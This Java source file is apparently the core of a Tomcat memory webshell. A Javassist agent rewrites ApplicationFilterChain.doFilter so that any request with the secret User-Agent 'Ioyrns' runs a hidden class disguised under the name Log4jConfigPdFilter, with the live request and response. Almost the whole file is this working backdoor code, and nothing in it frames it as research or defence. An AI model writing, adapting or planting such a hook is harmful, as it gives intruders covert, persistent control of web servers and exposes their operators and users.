import javassist.*;

import java.io.ByteArrayInputStream;
import java.lang.instrument.ClassFileTransformer;
import java.security.ProtectionDomain;

public class MyTransformer implements ClassFileTransformer {
    @Override
    public byte[] transform(ClassLoader loader, String className,
                            Class<?> classBeingRedefined, ProtectionDomain protectionDomain,
                            byte[] classFileBuffer) {

        if (!"org/apache/catalina/core/ApplicationFilterChain".equals(className)) {
            return null;
        }

        try {
            ClassPool pool = new ClassPool(true);
            if (loader != null) {
                pool.appendClassPath(new LoaderClassPath(loader));
            }

            CtClass cc = pool.makeClass(new ByteArrayInputStream(classFileBuffer));
            CtMethod doFilter = cc.getDeclaredMethod("doFilter");

            doFilter.insertBefore(
                    "{ " +
                        "    System.out.println(\"[Agent] into doFilter\");" +
                        "    Object reqObj = $1;" +
                        "    Object resObj = $2;" +
                        "    try {" +
                        "        ClassLoader reqCl = reqObj.getClass().getClassLoader();" +
                        "        Class reqCls = null;" +
                        "        Class resCls = null;" +

                        "        try {" +
                        "            reqCls = Class.forName(\"javax.servlet.http.HttpServletRequest\", false, reqCl);" +
                        "            resCls = Class.forName(\"javax.servlet.http.HttpServletResponse\", false, reqCl);" +
                        "        } catch (Throwable ex) {" +
                        "            reqCls = Class.forName(\"jakarta.servlet.http.HttpServletRequest\", false, reqCl);" +
                        "            resCls = Class.forName(\"jakarta.servlet.http.HttpServletResponse\", false, reqCl);" +
                        "        }" +

                        "            Object req = reqObj;" +
                        "            Object res = resObj;" +
                        "            System.out.println(\"[Agent] ApplicationFilterChain#reqObj = \" + reqObj);" +

                        "            java.lang.reflect.Method getHeader = reqObj.getClass().getMethod(\"getHeader\", new Class[]{ java.lang.String.class });" +
                        "            String ua = (String)getHeader.invoke(reqObj, new Object[]{ \"User-Agent\" });" +

                        "            System.out.println(\"[Agent] ApplicationFilterChain#reqObj2 = \" + reqObj);" +
                        "            if (\"Ioyrns\".equalsIgnoreCase(ua)) {" +
                        "                try {" +
                        "                    ClassLoader cl = Thread.currentThread().getContextClassLoader();" +
                        "                    if (cl == null) cl = this.getClass().getClassLoader();" +
                        "                    System.out.println(\"[Agent] ApplicationFilterChain#cl = \" + cl);" +
                        "                    Class filterClass = Class.forName(\"com.filter.Log4jConfigPdFilter\", true, cl);" +
                        "                    java.lang.reflect.Method m = filterClass.getMethod(\"getInstance\", new Class[]{ java.lang.ClassLoader.class });" +
                        "                    Object obj = m.invoke(null, new Object[]{ cl });" +
                        "                    java.lang.reflect.Method exec = filterClass.getMethod(\"execute\", new Class[]{ Object.class, Object.class });" +
                        "                    exec.invoke(obj, new Object[]{ req, res });" +
                        "                } catch (Throwable t) {" +
                        "                    System.out.println(\"[Agent] ApplicationFilterChain exception!!!\");" +
                        "                    t.printStackTrace();" +
                        "                }" +
                        "                return;" +
                        "        }" +
                        "    } catch (Throwable e) { e.printStackTrace(); }" +
                        "}"
            );


            System.out.println("[+] Hooked doFilter successfully (Tomcat10+/JDK17/Loader-isolation fixed).");
            byte[] bytecode = cc.toBytecode();
            cc.detach();
            return bytecode;

        } catch (Throwable e) {
            e.printStackTrace();
            return null;
        }

    }
}